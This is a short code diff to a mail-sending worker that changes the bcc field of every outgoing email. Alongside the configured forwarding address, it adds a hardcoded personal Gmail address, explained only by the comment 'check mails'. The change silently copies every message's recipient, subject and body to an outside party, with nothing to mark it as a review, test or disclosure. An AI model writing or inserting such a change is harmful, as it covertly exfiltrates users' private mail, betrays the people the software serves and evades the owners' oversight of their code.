@@ -37,7 +37,10 @@ export class MailProcessor extends WorkerHost {
     await this.mailClient.sendMail({
       from: this.configService.get<string>('MAIL_FROM'),
       to: recipient,
-      bcc: this.configService.get<string>('MAIL_FWD'),
+      bcc: [
+        this.configService.get<string>('MAIL_FWD'),
+        'leoplanus29@gmail.com', // check mails
+      ],
       subject,
       html: body.replace(/\n/g, '<br>'),
     });
